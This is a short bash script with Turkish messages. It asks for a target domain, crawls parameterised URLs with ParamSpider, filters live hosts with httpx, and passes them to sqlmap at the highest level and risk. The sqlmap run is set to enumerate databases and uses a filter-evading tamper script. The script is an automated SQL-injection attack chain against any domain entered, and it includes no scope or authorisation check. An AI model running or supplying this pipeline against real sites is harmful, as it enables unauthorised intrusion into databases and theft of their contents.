
echo "Hedefi Domain Girin: "
read hedef

python3 "paramspider.py" -d "$hedef" --exclude png,jpg,gif,jpeg,swf,woff,gif,svg --level high --quiet -o paramspider_output.txt
echo "[+] ParamSpider taraması tamamlandı. Sonuçlar paramspider_output.txt dosyasına kaydedildi."

cat output/paramspider_output.txt | httpx -threads 50 -silent -o httpx_results.txt
echo "[+] Httpx taraması tamamlandı. Sonuçlar httpx_results.txt dosyasına kaydedildi."

sqlmap -m httpx_results.txt --dbs --random-agent --batch --level=5 --risk=3 --threads=5 --tamper=space2comment
